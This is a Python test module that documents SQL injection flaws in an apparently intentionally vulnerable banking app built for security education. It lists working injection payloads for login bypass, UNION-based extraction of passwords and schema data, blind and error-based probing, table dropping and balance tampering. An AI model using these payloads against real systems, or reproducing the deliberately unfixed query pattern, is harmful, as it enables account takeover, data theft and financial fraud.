"""
Security tests for SQL injection vulnerabilities.

This module provides security validation tests that explicitly document and test
SQL injection vulnerabilities in the insecure banking application. These tests
are designed to validate that vulnerabilities exist for educational purposes
and are NOT intended to fix them.

Educational Purpose:
- Document SQL injection attack vectors
- Validate vulnerable code behavior
- Provide examples for security education
- Demonstrate impact of improper input sanitization

Constitutional Requirements:
- Tests MUST NOT fix vulnerabilities
- All SQL injection vulnerabilities MUST remain intact
- Tests should document expected vulnerable behavior
- Educational value must be preserved
"""

import pytest
from unittest.mock import patch, Mock, MagicMock
from django.test import TestCase

from apps.accounts.models import Account, CashAccount, CreditAccount
from apps.accounts.services import AccountService, CashAccountService, CreditAccountService


@pytest.mark.security
class TestSQLInjection(TestCase):
    """Security validation tests for SQL injection vulnerabilities."""

    def setUp(self):
        """Set up test data for SQL injection validation."""
        # Create test accounts for injection testing
        self.test_account = Account.objects.create(
            username='testuser',
            name='Test',
            surname='User',
            password='testpass123'
        )

        self.test_cash_account = CashAccount.objects.create(
            number='1234567890',
            username='testuser',
            description='Test Cash Account',
            availableBalance=1000.00
        )

    def test_sql_injection_in_find_users_by_username_and_password(self):
        """
        Test SQL injection vulnerability in AccountService.find_users_by_username_and_password().

        Educational Purpose: This test demonstrates how SQL injection can bypass
        authentication by manipulating the WHERE clause in user lookup queries.

        Vulnerability: The method constructs SQL queries using string concatenation
        without proper parameter binding, allowing injection attacks.
        """
        # Common SQL injection payloads for authentication bypass
        sql_injection_payloads = [
            # Classic authentication bypass
            ("admin'--", "anything"),
            ("admin' OR '1'='1'--", "anything"),
            ("admin'; DROP TABLE accounts; --", "password"),

            # Union-based injection
            ("admin' UNION SELECT 'admin','admin','admin','admin' --", "password"),
            ("' OR 1=1 UNION SELECT username,password,name,surname FROM accounts --", ""),

            # Boolean-based blind injection
            ("admin' AND 1=1 --", "password"),
            ("admin' AND 1=2 --", "password"),

            # Time-based blind injection
            ("admin'; WAITFOR DELAY '00:00:05'; --", "password"),
            ("admin' AND (SELECT COUNT(*) FROM accounts) > 0 --", "password"),
        ]

        for malicious_username, malicious_password in sql_injection_payloads:
            with self.subTest(username=malicious_username, password=malicious_password):
                with patch('web.services.connection') as mock_connection:
                    mock_cursor = Mock()
                    mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
                    mock_cursor.fetchall.return_value = []

                    # Call vulnerable method with injection payload
                    try:
                        result = AccountService.find_users_by_username_and_password(
                            malicious_username, malicious_password
                        )

                        # Verify SQL injection payload was passed through
                        mock_cursor.execute.assert_called()
                        executed_sql = mock_cursor.execute.call_args[0][0]

                        # Document the vulnerability: malicious input in SQL
                        self.assertIn(malicious_username, executed_sql)

                        # Log the vulnerable SQL for educational purposes
                        print(f"VULNERABLE SQL: {executed_sql}")
                        print(f"PAYLOAD: username='{malicious_username}', password='{malicious_password}'")

                    except Exception as e:
                        # Even if execution fails, the vulnerability exists
                        # Document that injection was attempted
                        print(f"SQL Injection attempted but failed: {e}")
                        print(f"PAYLOAD: username='{malicious_username}', password='{malicious_password}'")

    def test_sql_injection_in_find_users_by_username(self):
        """
        Test SQL injection vulnerability in AccountService.find_users_by_username().

        Educational Purpose: Demonstrates how user enumeration and data extraction
        can be performed through SQL injection in user lookup functions.

        Vulnerability: Username parameter is directly concatenated into SQL queries
        without sanitization or parameter binding.
        """
        # SQL injection payloads for data extraction
        injection_payloads = [
            # Simple injection to extract all users
            "' OR '1'='1",
            "' OR 1=1 --",

            # Union-based data extraction
            "' UNION SELECT username,password,name,surname FROM accounts --",
            "' UNION SELECT 'extracted','data','from','injection' --",

            # Conditional injection for data enumeration
            "admin' AND LENGTH(password) > 5 --",
            "admin' AND SUBSTRING(password,1,1) = 'a' --",

            # Nested query injection
            "' OR username IN (SELECT username FROM accounts WHERE name LIKE '%admin%') --",

            # Database metadata extraction
            "' UNION SELECT table_name,'','','' FROM information_schema.tables --",
            "' UNION SELECT column_name,'','','' FROM information_schema.columns --",
        ]

        for payload in injection_payloads:
            with self.subTest(payload=payload):
                with patch('web.services.Account.objects.raw') as mock_raw:
                    mock_raw.return_value = [self.test_account]

                    try:
                        # Execute vulnerable method with injection payload
                        result = AccountService.find_users_by_username(payload)

                        # Verify injection payload was used in raw SQL
                        mock_raw.assert_called_once()
                        raw_sql = mock_raw.call_args[0][0]

                        # Document vulnerability: payload in SQL query
                        self.assertIn(payload, raw_sql)

                        # Educational logging
                        print(f"VULNERABLE RAW SQL: {raw_sql}")
                        print(f"INJECTION PAYLOAD: {payload}")

                        # Verify method still returns data (vulnerability impact)
                        self.assertIsInstance(result, list)

                    except Exception as e:
                        # Document injection attempt even if it fails
                        print(f"SQL Injection attempted in find_users_by_username: {e}")
                        print(f"PAYLOAD: {payload}")

    def test_sql_injection_in_cash_account_services(self):
        """
        Test SQL injection vulnerability in CashAccountService methods.

        Educational Purpose: Shows how financial data can be compromised through
        SQL injection in account balance and transaction queries.

        Vulnerability: Account numbers and usernames are concatenated directly
        into SQL queries without parameter binding.
        """
        # Financial data extraction payloads
        financial_injection_payloads = [
            # Extract all account balances
            "' UNION SELECT number,username,description,CAST(availableBalance AS TEXT) FROM cash_accounts --",

            # Conditional balance enumeration
            "1234567890' AND availableBalance > 10000 --",
            "1234567890' AND availableBalance BETWEEN 1000 AND 5000 --",

            # Account number enumeration
            "' OR number LIKE '123%' --",
            "' OR LENGTH(number) = 10 --",

            # Cross-table data extraction
            "' UNION SELECT username,password,name,surname FROM accounts --",

            # Account manipulation attempts
            "'; UPDATE cash_accounts SET availableBalance = 999999 WHERE username = 'testuser'; --",
            "'; INSERT INTO cash_accounts VALUES ('9999999999','hacker','Hacked Account',1000000); --",
        ]

        for payload in financial_injection_payloads:
            with self.subTest(payload=payload):
                with patch('web.services.connection') as mock_connection:
                    mock_cursor = Mock()
                    mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
                    mock_cursor.fetchall.return_value = []

                    try:
                        # Test injection in cash account lookup
                        result = CashAccountService.find_cash_accounts_by_username(payload)

                        # Verify injection was executed
                        if mock_cursor.execute.called:
                            executed_sql = mock_cursor.execute.call_args[0][0]
                            self.assertIn(payload, executed_sql)

                            # Educational logging
                            print(f"FINANCIAL DATA INJECTION SQL: {executed_sql}")
                            print(f"PAYLOAD: {payload}")

                    except Exception as e:
                        print(f"Financial injection attempted: {e}")
                        print(f"PAYLOAD: {payload}")

                # Test injection in balance lookup
                with patch('web.services.connection') as mock_connection:
                    mock_cursor = Mock()
                    mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
                    mock_cursor.fetchone.return_value = (1000.0,)

                    try:
                        # Test balance extraction with injection
                        balance = CashAccountService.get_from_account_actual_amount(payload)

                        if mock_cursor.execute.called:
                            executed_sql = mock_cursor.execute.call_args[0][0]

                            # Document financial vulnerability
                            print(f"BALANCE EXTRACTION SQL: {executed_sql}")
                            print(f"PAYLOAD: {payload}")

                    except Exception as e:
                        print(f"Balance injection attempted: {e}")

    def test_documented_sql_injection_impact(self):
        """
        Document the expected impact and behavior of SQL injection vulnerabilities.

        Educational Purpose: Provides comprehensive documentation of how SQL
        injection vulnerabilities manifest in the banking application.
        """
        # Document vulnerability characteristics
        vulnerability_documentation = {
            "vulnerability_type": "SQL Injection",
            "cwe_id": "CWE-89",
            "owasp_category": "A03:2021 – Injection",
            "severity": "Critical",

            "affected_methods": [
                "AccountService.find_users_by_username_and_password()",
                "AccountService.find_users_by_username()",
                "CashAccountService.find_cash_accounts_by_username()",
                "CashAccountService.get_from_account_actual_amount()",
                "CreditAccountService.find_credit_accounts_by_username()",
                "ActivityService.find_transactions_by_cash_account_number()"
            ],

            "root_cause": "Direct string concatenation in SQL query construction",

            "attack_vectors": [
                "Authentication bypass through login forms",
                "Data extraction via user enumeration",
                "Financial data exposure through account queries",
                "Database metadata disclosure",
                "Potential data modification through UPDATE/INSERT/DELETE"
            ],

            "example_payloads": [
                "admin'--",
                "' OR '1'='1",
                "' UNION SELECT username,password FROM accounts --",
                "'; DROP TABLE accounts; --"
            ],

            "educational_value": [
                "Demonstrates importance of parameterized queries",
                "Shows impact of input validation failures",
                "Illustrates authentication bypass techniques",
                "Provides examples for secure coding training"
            ],

            "mitigation_notes": "DO NOT IMPLEMENT - Vulnerabilities preserved for educational purposes"
        }

        # Assert documentation exists (test always passes - for documentation)
        self.assertIsNotNone(vulnerability_documentation)

        # Log comprehensive vulnerability documentation
        print("\n" + "="*80)
        print("SQL INJECTION VULNERABILITY DOCUMENTATION")
        print("="*80)

        for key, value in vulnerability_documentation.items():
            print(f"\n{key.upper().replace('_', ' ')}:")
            if isinstance(value, list):
                for item in value:
                    print(f"  • {item}")
            else:
                print(f"  {value}")

        print("\n" + "="*80)
        print("END DOCUMENTATION")
        print("="*80)

    def test_sql_injection_payload_effectiveness(self):
        """
        Test the effectiveness of various SQL injection payload types.

        Educational Purpose: Demonstrates different classes of SQL injection
        attacks and their potential impact on the application.
        """
        payload_categories = {
            "authentication_bypass": [
                "admin'--",
                "admin' OR '1'='1'--",
                "admin' OR 1=1#",
            ],

            "union_based": [
                "' UNION SELECT username,password,name,surname FROM accounts--",
                "' UNION SELECT 1,2,3,4--",
            ],

            "boolean_blind": [
                "admin' AND 1=1--",
                "admin' AND 1=2--",
                "admin' AND LENGTH(password)>5--",
            ],

            "time_based": [
                "admin'; WAITFOR DELAY '00:00:01'--",
                "admin' AND (SELECT COUNT(*) FROM accounts)>0--",
            ],

            "error_based": [
                "admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "admin' AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            ]
        }

        for category, payloads in payload_categories.items():
            print(f"\n--- Testing {category.upper()} SQL Injection ---")

            for payload in payloads:
                with patch('web.services.connection') as mock_connection:
                    mock_cursor = Mock()
                    mock_connection.cursor.return_value.__enter__.return_value = mock_cursor
                    mock_cursor.fetchall.return_value = []

                    try:
                        # Test payload against vulnerable method
                        AccountService.find_users_by_username(payload)

                        if mock_cursor.execute.called:
                            sql = mock_cursor.execute.call_args[0][0]
                            print(f"CATEGORY: {category}")
                            print(f"PAYLOAD: {payload}")
                            print(f"RESULTING SQL: {sql}")
                            print("-" * 40)

                    except Exception as e:
                        print(f"PAYLOAD: {payload} -> ERROR: {e}")

        # Test always passes - this is for documentation/logging
        self.assertTrue(True, "SQL injection vulnerability documentation complete")
